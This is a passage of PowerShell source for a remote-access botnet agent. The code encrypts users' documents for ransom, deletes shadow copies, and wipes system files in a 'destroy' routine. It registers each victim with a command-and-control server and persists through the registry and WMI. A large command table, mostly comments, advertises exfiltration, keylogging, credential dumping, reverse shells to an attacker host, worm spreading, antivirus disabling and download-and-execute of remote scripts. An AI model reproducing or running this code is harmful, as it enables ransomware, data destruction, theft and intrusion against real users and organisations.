			foreach ($ext in $exttocrypt) {ls $startfolder*.$ext -Recurse|foreach { $path = Resolve-Path $_.FullName ; $Command = "$env:userprofile\aex.exe -e -p $cypher $path";	[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString; del $path /F /S /Q; echo "$message" > "$path.txt"; ren "$path.txt" "ALERT.txt"}}		
			rd /s c:$Recycle.Bin
			$Shell = New-Object -ComObject Shell.Application;$RecycleBin = $Shell.Namespace(0xA);$RecycleBin.Items() | foreach{Remove-Item $_.Path -Recurse -Confirm:$false}
			$Command = "$sdel -p 2 -q -z C:";
			[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString; 
			$Command = "$sdel -p 2 -q -z D:";[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString;
			$Command = "$sdel -p 2 -q -z E:";[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString;
			vssadmin delete shadows /for=c: /all /quiet
			vssadmin delete shadows /for=D: /all /quiet
			vssadmin delete shadows /for=e: /all /quiet
			#assoc .exe=lolfile	
			$result = ls | findstr aes | Out-String
			sendC2 $pc $result $id
			}
		Function DecryptCommand { # !decrypt|Q4dsd87rn1AE5@54fDER4584S2dZFjjk|C:\users\
			[CmdletBinding()] param( 
			[string]$id
			)
			$exists = "$env:userprofile\aex.exe"
			If (Test-Path $exists){
				del "$env:userprofile\rec.txt"
				del "$env:userprofile\aex.exe"
			}
			#DeCryptor
			[string] $cypher = $LatestOrder.split('|')[1]
			[string] $startfolder = $LatestOrder.split('|')[2]
			$downloadURL = "$c2c/ROOT_FOLDER/link/aes.txt"
            [string] $FileOnDisk =  "$env:userprofile\rec.txt"
            downloadFile $downloadURL $FileOnDisk
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\aex.exe", $temp)
			attrib +h "$env:userprofile\aex.exe"
			[string[]] $exttocrypt = @()
            $exttocrypt += 'doc','docx','xls','xlsx','ppt','pptx','jpg','png','bmp','pdf','txt','log','mp3','avi','mpeg','mp4'
			foreach ($ext in $exttocrypt) {ls $startfolder*.$ext -Recurse|foreach { $path = Resolve-Path $_.FullName ; $Command = "$env:userprofile\aex.exe -d -p $cypher $path";	[string] $CmdPath = "$env:windir\System32\cmd.exe";[string] $CmdString = "$CmdPath" + " /C " + "$Command"; Invoke-Expression $CmdString; del "ALERT.txt" /F /S /Q}}		
			rd /s c:$Recycle.Bin
			#assoc .exe=exefile		
			}			 
	# Bitcoin mining
		Function BitcoinMiningCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			# content
			$result = 'ok'
			sendC2 $pc $result $id
		}
	# Denial of Service (DDoS)
		Function DestroyCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			$result = 'Destruction attempted - session must be unavailable now !'
			sendC2 $pc $result $id
			
			$shut = "shutdown /s /f /t 1"
			$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
			$registryPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
			$name = "FuckYou"
			New-ItemProperty -Path $registryPath1 -Name $name -Value $shut -PropertyType String -Force | Out-Null
			New-ItemProperty -Path $registryPath2 -Name $name -Value $shut -PropertyType String -Force | Out-Null
			
			taskkill explorer.exe /f /im
			Start-Sleep -Seconds 5 
			rename-item C:\windows\system32\explorer.exe explorer.fuck
			
			del C:\windows\system32\*.* /s /f /q 
			attrib +r +a +h C:\*.* /S /D
				
			<#clean pnt
			#>
			}
	# Operations Control
		Function ChocoInstallCommand { # !choco  - install Choco and some usefull plug
			[CmdletBinding()] param( 
			[string]$id
			)
			$InstallDir="C:\ProgramData\choco"
			$env:chocolateyInstall=$InstallDir
			iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'));
			SET PATH=%PATH%;C:\ProgramData\Choco\bin;
			$env:chocolateyUseWindowsCompression = 'true'	
			[string] $result = Dir env:\ |findstr choco | Out-String
			sendC2 $pc $result $id
		}
		Function UpgradePShCommand { # !pshupgrade  --  upgrade powershell version
			[CmdletBinding()] param( 
			[string]$id
			)
			choco upgrade powershell -version 3.0.20120904 -y
			[string] $Global:pshversion = $PSVersionTable.psversion.Major
			$result = "PowerShell version: $pshversion"
			sendC2 $pc $result $id
		}	
		Function AptGetCommand { # !aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package with linux style using CHOCOLATEY. You must first run !choco to be able to use it --> check chocolatey.org website for more commands
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $Package = $LatestOrder.split('|')[1]			
			choco install $Package -y
			$result = chocolatey list -localonly
			sendC2 $pc $result $id
			# install git to be able to use SSH
			# choco install git -params "/GitAndUnixToolsOnPath" -y
		} 
		Function SleepCommand {
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $Global:sleeptime1 = $LatestOrder.split('|')[1]
			[string] $Global:sleeptime2 = $LatestOrder.split('|')[2]
			[string] $Global:sleeptime3 = $LatestOrder.split('|')[3]
            $result = 'ok'
			sendC2 $pc $result $id	 	
        }		
        Function KillDateChecker {
            $DateCheck = (Get-Date) -lt (Get-Date $EndopsDate)
                if ($DateCheck -ne $True)  {
                    Exit
                }
        }           
        Function WorkHoursChecker {
            $StartTimeCheck = (Get-Date) -ge (Get-Date $WorkopsStart)
            $EndTimeCheck = (Get-Date) -le (Get-Date $WorkopsEnd)    
                if (($StartTimeCheck -eq $True) -and ($EndTimeCheck -eq $True)) {
                    Write-Verbose "It is during work hours. Continuing"
                }
                else {
                    Write-Verbose "Not during work hours. Restarting"
                    Invoke-Pnt
                }
			}
        Function CheckIPAddress {
            #Check to see if IP address is in allowed range
            Write-Verbose "The following IPs are allowed: $EngagementIPs"
             $HostIpAddresses = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | % {$_.GetIPProperties()} | %{$_.UnicastAddresses} | % {$_.Address} | ? {$_.Address} | % {$_.IPAddressToString}
                [string[]] $CheckAnswer = @()
                
                foreach ($IpAddress in $HostIpAddresses) { 
                    $CheckAnswer += $EngagementIPs.Contains("$IpAddress")
                    Write-Verbose "Checking if $IpAddress is allowed"
                    Write-Verbose $CheckAnswer[-1]
                }
            
                if ($CheckAnswer -notcontains "True") {
                    Write-Verbose "No allowed IP address found. Checking external IP"
                    $ExternalIpAddress = $WebClientObject.downloadString('http://ifconfig.me/ip')
                    $CheckAnswer += $AllowedAddress.Contains("$ExternalIpAddress")
                    $WebClientObject.Dispose()
                }

                if ($CheckAnswer -notcontains "True") {
                    Write-Verbose "No allowed internal or external addresses found. Exiting"
                    Exit
                }
         
            Write-Verbose "Allowed IP address found. Continuing"
        }	
        Function Get-Latestcmd { # Phone C2 for new instructions
            [string] $CmdChannelURL = "$c2c/ROOT_FOLDER/link/xml.php?pc=$pc"
            Write-Verbose "Checking latest command at:  $CmdChannelURL"
			$XMLCmdChannelResult = New-Object System.Xml.XmlDocument
            $XMLCmdChannelResult.Load($CmdChannelURL)
			[string[]] $LatestOrderArray = @()
			$XMLCmdChannelResult.statuses.status.text
			$XMLCmdChannelResult.statuses.status | Foreach { $LatestOrder = $_.text; $id = $_.id; 
			#Operate -LatestOrder $text -id $LatestOrderID				
			try {
			Write-Verbose "Check Kill Date"
            KillDateChecker
            Write-Verbose "Check Work Hours"
            WorkHoursChecker         
            #Check to see if we are running with admin rights
            $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
            Write-Verbose "Are we running as admin? $IsAdmin"            
            #Check to see if a proxy is configured and if it is, use it
            $ProxyCheck = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable
                if ($ProxyCheck -eq 1) {
                    Write-Verbose "Proxy configuration found, enabling proxy settings"
                    [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
                    $WebProxyObject.Address = $ProxyAddress
                    $WebProxyObject.UseDefaultCredentials = $True
                    $WebClientObject.Proxy = $WebProxyObject
                }
            #Pull the user agent string from the registry
            [string] $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent'
            $WebClientObject.Headers.Add("user-agent", $UserAgent)              
            Write-Verbose "The latestOrder is $LastOrderFinal"
			if (!$LatestOrder) { 
				HelloOnline 
				}
			else {
			[string] $BotCommand = $LatestOrder.split('|')[0]
			# Try to avoid loop in one command in case of error 
			if ($BotCommand -eq $LatestBotCommand){
				$result = 'ERROR ! Agent has jump to avoid loop'
				sendC2 $pc $result $id
				}
			else {
            Write-Verbose "Evaluating command $BotCommand"
			Switch ($BotCommand) {
				!quit {QuitCommand $id}				  #  !quit   -     Delete all artifacts and clean computer. The end of operations
                !hello {HelloCommand $id}			  #  !hello
                !changec2 {ChangeC2Command $id}		  #  !changec2|http:\newc2cserver.com
				!vector {EncodedVectorCommand $id}	  #  !vector|SBOFSBOFSBOF== Change the encoded string of payload vector
				!beef {BeefCommand $id}               #  !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe
                !choco {ChocoInstallCommand $id}      #  !choco  - install Choco and some usefull plug
				!aptget {AptGetCommand $id}           # !aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package with linux style using CHOCOLATEY. You must first run !choco
				!pshupgrade {UpgradePShCommand $id}   #  !pshupgrade  --  upgrade powershell version
				!speak {SpeakCommand $id}			  #  !speak|you have been, hacked.
				!recon {ReconCommand $id}             #  !recon
				!getpid {GetPidCommand $id}			  #  !getpid|lsass -- Get the PID of a process
				!whoami {WhoAmICommand $id}			  #  !whoami  -  Who am I
				!update {UpdateCommand $id}           #  !update --    Update c2c and every others usefull stuff
				!exfilfile {ExfilFilesCommand $id}    #  !exfilfile|C:\users\secret.zip         
				!zip {ZipCommand $id}                 #  !zip|C:\users\public\documents\|C:\users\secret.zip
                !exfiltrate {ExfiltrateCommand $id}   #  !exfiltrate|C:\users\  
				!explorer {ExplorerCommand $id}       #  !explorer|1|  >only list share -   !explorer|0|C:\users >only list specified local folder  -  !explorer|1|C:\users  >list shares and specified local folder 
				!acl {AclCommand $id} 				  #  !acl|C:\users\toto.txt  -  Return NTFS Permission of the given share, local file or folder
				!enumshare {EnumShareCommand $id}	  #  !enumshare|toto|F8580EAGFH89725   -  scan all the domain IP and enumerate shares using hash of the provided credentials 
				!enumsession {EnumSessionCommand $id} #  !enumsession|toto|F8580EAGFH89725 -  scan all the domain IP and enumerate sessions using hash of the provided credentials 
				!extractkey {ExtractKeyCommand $id}   #  !extractkey    OR remotely: !extractkey|domain\admin|password 
				!outlook {Get-Outlook $id}  		  #  !outlook        - List all pst archives
				!run {RunCommand $id}				  #  !run|net localgroup adminstrators > c:\windows\temp\ad.txt
                !downexec {downexecCommand $id}		  #  !downexec|http://pastebinlikesite.com/moreevilpowershellscript.txt
                !download {downloadCommand $id}		  #  !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\svchost.exe
                !bits {bitsadminCommand $id}		  #  !bits|http://tools.com/nc.exe|c:\windows\temp\svchost.exe
                !url {UrlCommand $id}			      #  !url|http://www.youtube.com/watch?v=dQw4w9WgXcQ
                !sleeps {SleepCommand $id}			  #  !sleeps|10|60|90
                !checkwmi {CheckWMICommand $id}		  #  !checkwmi -- Get WMI value to verify PC ID persistent value registration AND WMI persistence entry
				!thunder {ThunderCommand $id} 		  #  !thunder|http://www.youtube.com/watch?v=v2AC41dglnM
                !eicar {EicarCommand $id}			  #  !eicar      -    Triggering AV alarm
                !scan {ScanCommand $id}   			  #  !scan       -    Network port scanning like with Nmap, all over the LAN
                !wcry {WannacryCheckCommand $id}      #  !wcry       -    Check system against WannaCry MS17-010 vulnerability
				!popup {PopupCommand $id}			  #  !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
                !persist {PersistCommand $id}		  #  !persist|reg/ startup/ task/ wmi/ sc/ all |calc
                !elevate {ElevateCommand $id}		  #  !elevate|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))
				!privesc {PrivescCommand $id}	      #  !privesc - Try to inject token in privilegied process and Check local privesc vulnerabilities (sherlock  & powerUp)
				!migrate {MigrateCommand $id} 		  #  !migrate     - Inject shellcode into the process ID (default = explorer) of your choosing or within the context of the running PowerShell process.
				!ntlmspoof {InveighCommand $id}	  	  #  !ntlmspoof   - Use inveigh to peform Spoofing attack and capture various password (SMB, NTLM, HTTP, WPAD ...)
				!arpspoof {ArpspoofCommand $id}	  	  #  !arpspoof 
				!arp {ArpScanCommand $id}	  	  	  #  !arp  -  ping all the IP scope and return resulting arp cache (arp -a)
				!webinject {WebInjectCommand $id}	  #  !webinject   - Use interceptor.txt to inject html content in every web request 
				!hotpotatoes {HotPotatoes $id}        #  !hotpotatoes|net user tater Winter2016 /add && net localgroup administrators tater /add
				!adduser {AddUserCommand $id}         #  !adduser|johndoe|p@s5w0rd|domain   -  Add user in local admin group and domain admin group if specified
				!worm {WormCommand $id} 		  	  #  !worm|login|password   - download psexec, use credential and push bot in every ip in the LAN
				!pthsmb {PthCommand $id}              #  !pthsmb|192.168.3.202|toto|F6F38B793DB6A94BA04A5|powershell.exe 'calc.exe'
				!pthwmi {WmilatmvCommand $id}         #  !pthwmi|192.168.3.202|toto|F6F38B793DB6A94BA04A5|powershell.exe 'calc.exe' 
				!ngrok {NgrokTunnelCommand $id} 	  #  !ngrok|authkey|http|80     - Expose zombie(TCP/IP) PC to Internet so that you can connect any tools
				!socks {SocksProxyCommand $id} 		  #	 !socks|1234 - Create a Socks 4/5 proxy on port 1234
				!portfwd {PortFwdCommand $id} 		  #  !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward. liste localy on 33389 and forward to local 3389			
				!c2channel {ChannelCommand $id} 	  #  !c2channel|gmail|http:\\server\config.ini - change c2 channel (Covert channel : http, onedrive, gdrive, dropbox ...)
				!proxy {SetProxyCommand $id}          #  !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
				#!uaclevel {SetUACLevelCommand $id}   #  !uaclevel|on    ou   uaclevel|off
				!psexec {PsexecCommand $id}    	  	  #  !psexec|domain\admin|password|192.168.3.202|powershell.exe 'calc.exe'    - download psexec, use credential and push bot in targeted ip 
                !infectmacro {InfectmacroCommand $id} #  !infectmacro|C:\Users|macro.txt
				!shellcode {InjectShellcode $id}      #  !shellcode|@(0x90,0x90,0xC3)   -  Inject the specifyed shellcode. msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
				!usbspread {UsbspreadCommand $id}	  #  !usbspread|on     - Infect USB with malicious lnk
				!wallpaper {WallpaperCommand $id}	  #  !wallpaper|http://wallpapercave.com/wp/ky43p3I.jpg/|c:\windows\temp\1.jpg
				!webcam {WebcamCommand $id}           #  !webcam
                !screenshot {ScreenshotCommand $id}   #  !screenshot
                !streaming {ScreenStreaming $id}      #  !streaming|on / off - take screenshot at every hello (active spy)	
				!geolocate{GeolocateCommand $id}	  #	 !geolocate
				!geolocategps{GeolocateGPSCommand $id}#	 !geolocategps
				!wshell {WebShellCommand $id}         #  !wshell|8080  -  use it with !ngrok to expose localhost port 8080 over Internet
                !dropboxc2 {DropboxC2Command $id}     #  !dropboxc2  -  start dropbox client backdoor (configure and start python C2 first)  
				!ReverseShell{ReverseShellCommand $id}#  !reverseshell|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back
				!nc{NetCatShell $id}                  #  !nc|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back             
				!meterpreter {MeterpreterShell $id}	  #  !meterpreter|10.0.0.23|443
                !jsrat {JsRatShell $id} 	 		  #  !jsrat|192.168.10.96     # Handle connexion with: powershell.exe -Exe Bypass -File c:\test\JSRat.txt  & change listening IP ADDRESS in jsrat file
                !httprat {HttpRatShell $id}           #  !httprat|212.74.21.23  OR  !httprat|xxxxxx.ngrok.io   (without HTTP/s) 
				!vnc {VncCommand $id}                 #  !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234
				!rdp {RDPCommand $id}                 #	 !rdp|authkey
				!credential {CredentialCommand $id}   #  !credential
                !phish {PhishingCommand $id}          #  !phish|facebook.com|http://xxxx.ngok.io/facebook  -  setup local http server, host phishing page and spoof DNS hosts.txt
				!keylog {KeylogCommand $id} 		  #  !keylog|on / off
			    !hashdump {hashdumpCommand $id} 	  #  !hashdump  - Dump hash password
				!procdump {ProccessDumpCommand $id}	  #  !procdump  - Dump privileged process and use mimikatz in attack machine to extract password in clear
				!remotemimikatz{MmikatzCommand $id}   #  !remotemimikatz
				!mimikatz{MmikatzCommand $id}		  #  !mimikatz
				!clearevent {ClearEventLog $id}       #	 !clearevent
				!firewall {FirewallCommand $id}       #	 !firewall|on / off
				!logbypass {LogBypassCommand $id}     #	 !logbypass
				!killsysmon {SysmonKillCommand $id}   #	 !killsysmon
				!windefkill {winDefKillCommand $id}   #  !windefkill   OR !windefkill|10.10.10.2   -  Kill Windows Defender locally or remotely
				!extractlog {ExtractLogCommand $id}   #  !extractlog|system
				!macattrib {MacAttribCommand $id}  	  #  !macattrib|C:\secret.txt|01/03/2006 12:12 pm
				#!ddos {DdosCommand $id}              #  !ddos|http://target.com
				!encrypt {EncryptCommand $id}         #  !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\users\      Param 2 MUST ALWAYS END WITH "\"    - encrypt all "doc,docx,xlx,xlsx,ppt,pptx,jpg,png,bmp,pdf,txt,log,mp3,avi,mpeg,mp4" files
				!decrypt {DecryptCommand $id}		  #  !decrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\users\		Param 2 MUST ALWAYS END WITH "\"
				!bitcoin {BitcoinMiningCommand $id}   #  !bitcoin   # Bitcoin mining, enslave the bot ;-)
				!dnsspoof {DnsSpoofCommand $id}       #  !dnsspoof|127.0.0.1  facebook.com|0/1  --> 1 => add, 0 => clean & add
				!http {HttpServerCommand $id} 	      #  !http|80
				!destroy {DestroyCommand $id}        #  !destroy the system
				!sendmail {SendmailCommand $id}       #  !sendmail|target@corp.com|subject|Hello Im your friend|c:\evil.pdf    -  Send email from the compromised system
				!browserdump {BrowserDumpCommand $id} #  !browserdump
				#!backdoorlnk {BackdoorlnkCommand $id}#  !
				!bypassuac {BypassUacCommand $id}	  #  !bypassuac|cmd   OR !bypassuac  - Bypass UAC and execute command in a privileged context.
				!sniff {SniffCommand $id}			  #  !sniff|10   Capture TCP/IP packet - Open with Microsoft Message Analyzer
				}
			}
			[string] $LatestBotCommand = $BotCommand
			Write-Host "Executed: $LatestBotCommand" -ForegroundColor Green
			}
			# Random Wait ...
            RandomWait
       }
			catch {
            Write-Verbose "Error has occurred. Restarting  $Error[0]"
            Invoke-Pnt
        }
			finally {
            [int] $LastOrderFinal = [convert]::ToInt32($id, 10) 
        }      
			} 
            Write-Verbose "The Latest Command ID is:  $LatestOrderArray"		
        }         
    $ErrorActionPreference = 'SilentlyContinue'                            
    $WebClientObject = New-Object System.Net.WebClient
    $WebProxyObject = New-Object System.Net.WebProxy
	#[string] $CommandID
	Get-Latestcmd          
    [int] $Global:monitoring = 0
    [int] $Global:LastOrderFinal = 0
	Write-Verbose "Monitoring: $monitoring"
    }
 	for (;;) {	# Main run
		$t = TestInternet
		if ($t -eq $True) { # test connexion
			$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") 
			[string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
			$uconnect = TestURLstatus -URL $c2c
				if ($uconnect -eq $True) { # test URL c2
					Invoke-drn #-Verbose
					Write-Verbose 'Activate sleep !'	
				}
				else{
					while ($uconnect -eq $False) { #check internet connexion before continue (wait until internet is up)
						$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") 
						[string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
						$uconnect = TestURLstatus -URL $c2c
						Start-Sleep -Seconds $sleeptime2 
						if ($uconnect -eq $True) {				
							break
						}
					}
				Invoke-drn #-Verbose
				Write-Verbose 'Activate sleep !'			
				}		
			}
		else {
			while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
				$t = TestInternet
				Start-Sleep -Seconds 10 
				if ($t -eq $True) {				
					break
				}
			}
			$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") 
			[string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
			$uconnect = TestURLstatus -URL $c2c
				if ($uconnect -eq $True) { # test URL c2
					Invoke-drn #-Verbose
					Write-Verbose 'Activate sleep !'	
				}
				else{
					while ($uconnect -eq $False) { #check internet connexion before continue (wait until internet is up)
						$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") 
						[string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
						$uconnect = TestURLstatus -URL $c2c
						Start-Sleep -Seconds $sleeptime2 
						if ($uconnect -eq $True) {				
							break
						}
					}
				Invoke-drn #-Verbose
				Write-Verbose 'Activate sleep !'			
				}	
		}
	}	
}
## Create and initialize bot instance on C2C Server
Function InitializeBot {
	$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1] #
	$computerName = (gi env:\Computername).Value #
	$datebase = Get-Date -format D
	$dateString = Get-Date -format MM-dd-yyyy
	$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
	$domain = (Get-WmiObject win32_computersystem).Domain
	$organisation = $domain
	if ($pshversion -lt 3) {
		$comgeo = "$env:userprofile\AppData\cl.exe http://ipinfo.io/json"
		[string] $geoinfo = executer -runLocal $comgeo			
		} 
	else {
		[string] $geoinfo = (Invoke-WebRequest http://ipinfo.io/json).Content 
		}
	# Add Computer
	$postParams = @{id=$pc;hostname=$computerName;ip=$ip;domain=$domain;org=$organisation;ops=$operation;geo=$geoinfo;table='computer'}
	$postParams2 = @{pc=$pc}
	$t = TestInternet
	if ($t -eq $True) {
		if ($pshversion -lt 3) {
			$Command = "$env:userprofile\AppData\cl.exe -X POST -F id=$pc -F hostname=$computerName -F ip=$ip -F domain=$domain -F org=$organisation -F ops=$operation -F geo=$geoinfo -F table=computer $c2c/ROOT_FOLDER/link/add.php"
			executer -runLocal $Command
		} else { Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/add.php" -Method POST -Body $postParams }					
	}
	else {
		while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
			$t = TestInternet
			Start-Sleep -Seconds 10 
				if ($t -eq $True) {
				break
				}
			}
		if ($pshversion -lt 3) {
			$Command = "$env:userprofile\AppData\cl.exe -X POST -F id=$pc -F hostname=$computerName -F ip=$ip -F domain=$domain -F org=$organisation -F ops=$operation -F geo=$geoinfo -F table=computer $c2c/ROOT_FOLDER/link/add.php"
			executer -runLocal $Command
		} else { Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/add.php" -Method POST -Body $postParams }					
		}
	# Add HelloOnline -  control
	if ($pshversion -lt 3) {
		$Command2 = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc $c2c/ROOT_FOLDER/link/hello.php"
		executer -runLocal $Command2
		} else {
		Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/hello.php" -Method POST -Body $postParams2
	}
}
## Curl for Communication with c2c if Powershell version is least than 3
Function Curl {
	[CmdletBinding()] param( 
		[string]$pc,
		[string]$result,
		[string]$id
		)
		$result = "`"$result`""
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc -F result=$result -F id=$id $c2c/ROOT_FOLDER/link/ok.php"
		executer -runLocal $Command
	}
Function Curl_Add {
	[CmdletBinding()] param( 
		[string]$date,
		[string]$result,
		[string]$pc,
		[string]$table
		)
		$result = "`"$result`""
		$Command = "$env:userprofile\AppData\cl.exe -X POST -F date=$date -F data=$result -F pc=$pc  -F table=$table $c2c/ROOT_FOLDER/link/add.php"
		executer -runLocal $Command
	}

################################################################################ 	
## Test if bot is already present on PC, if not it create instance of bot in C2 and zombie ID  on the local system (regOpskey,wmiOpskey)
if(($regOpskey) -AND !($wmiOpskey)){	
	if (!(get-itemproperty -path HKCU:\Software\$regOpskey -name "$regOpskey").$regOpskey) { 
	echo "empty value"
	$pc= [System.Guid]::NewGuid().ToString()
	REG ADD HKCU\Software\$regOpskey /v $regOpskey /t REG_SZ /d $pc /f
	InitializeBot	
	$t = TestInternet
	if ($t -eq $True) {
		Invoke-Pnt
	} else {
		while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
			$t = TestInternet
			Start-Sleep -Seconds 10 
			if ($t -eq $True) {				
				break
				}
			}
		Invoke-Pnt	
		}
	}
	else {	
	Write-Host "Key exist and is not empty. Check if pc exist ..."
	echo "Get key"
	$pc = (get-itemproperty -path HKCU:\Software\$regOpskey -name "$regOpskey").$regOpskey
	$t = TestInternet
		if ($t -eq $True) {
		# Create pc if it doesnt exist in server side, but the reg already exist. 
			$validate = (New-Object System.Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/validate.php?pc=$pc")		
			if ($validate -eq "nothing") { 
				Write-Host "validate pc return --> $validate.  try to re-initialize ..."
				InitializeBot }
			Write-Host "Start Ops"
			Invoke-Pnt
		} else {
			while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
				$t = TestInternet
				Write-Host "No Internet Connexion !!! "
				Start-Sleep -Seconds 10 
					if ($t -eq $True) {				
					break
					}
				}
			$validate = (New-Object System.Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/validate.php?pc=$pc")
			if ($validate -eq "nothing") { 
				Write-Host "validate pc return ---> $validate .  try to re-initialize ..."
				InitializeBot }
			Write-Host "Start Ops"
			Invoke-Pnt	
			}
		}
}
if(!($regOpskey) -AND ($wmiOpskey)){
	if (!(Get-WmiObject -Namespace root/subscription -Query "select * from CommandLineEventConsumer where name=`"$wmiOpskey`"")) { 	
		echo "empty value (WMI)"
		$pc= [System.Guid]::NewGuid().ToString()
		WMIRegisterPCKey
		InitializeBot	
		$t = TestInternet
		if ($t -eq $True) {
			Invoke-Pnt
		} 
		else {
			while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
				$t = TestInternet
				Start-Sleep -Seconds 10 
					if ($t -eq $True) {				
					break
					}
				}
			Invoke-Pnt	
			}
	
	}
	else {	
	Write-Host "Key exist and is not empty. Check if pc exist ..."
	echo "Get key (WMI)"
	$pc= (Get-WmiObject -Namespace root/subscription -Query "select * from CommandLineEventConsumer where name=`"$wmiOpskey`"").CommandLineTemplate
	$t = TestInternet
		if ($t -eq $True) {
		# Create pc if it doesnt exist in server side, but the reg already exist. 
			$validate = (New-Object System.Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/validate.php?pc=$pc")		
			if ($validate -eq "nothing") { 
				Write-Host "validate pc return --> $validate.  try to re-initialize ..."
				InitializeBot }
			Write-Host "Start Ops"
			Invoke-Pnt
		} else {
			while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
				$t = TestInternet
				Write-Host "No Internet Connexion !!! "
				Start-Sleep -Seconds 10 
					if ($t -eq $True) {				
					break
					}
				}
			$validate = (New-Object System.Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/validate.php?pc=$pc")
			if ($validate -eq "nothing") { 
				Write-Host "validate pc return ---> $validate .  try to re-initialize ..."
				InitializeBot }
			Write-Host "Start Ops"
			Invoke-Pnt	
			}
		}
}
if(($regOpskey) -AND ($wmiOpskey)){
	if (!(get-itemproperty -path HKCU:\Software\$regOpskey -name "$regOpskey").$regOpskey) { 
		echo "empty REG key"
		echo "Try to restore with WMI key"
		$pc= (Get-WmiObject -Namespace root/subscription -Query "select * from CommandLineEventConsumer where name=`"$wmiOpskey`"").CommandLineTemplate 
		if (!($pc)){$pc= [System.Guid]::NewGuid().ToString()
				WMIRegisterPCKey
				}
		REG ADD HKCU\Software\$regOpskey /v $regOpskey /t REG_SZ /d $pc /f
		InitializeBot	
		$t = TestInternet
		if ($t -eq $True) {
			Invoke-Pnt
		} else {
			while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
				$t = TestInternet
				Start-Sleep -Seconds 10 
				if ($t -eq $True) {				
					break
					}
				}
			Invoke-Pnt	
			}
		}
	else {	
	Write-Host "Key exist and is not empty. Check if pc exist ..."
	echo "Get key (REG & WMI)"
	$pc = (get-itemproperty -path HKCU:\Software\$regOpskey -name "$regOpskey").$regOpskey
	$t = TestInternet
		if ($t -eq $True) {
		# Create pc if it doesnt exist in server side, but the reg already exist. 
			$validate = (New-Object System.Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/validate.php?pc=$pc")		
			if ($validate -eq "nothing") { 
				Write-Host "validate pc return --> $validate.  try to re-initialize ..."
				InitializeBot }
			Write-Host "Start Ops"
			Invoke-Pnt
		} else {
			while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
				$t = TestInternet
				Write-Host "No Internet Connexion !!! "
				Start-Sleep -Seconds 10 
					if ($t -eq $True) {				
					break
					}
				}
			$validate = (New-Object System.Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/validate.php?pc=$pc")
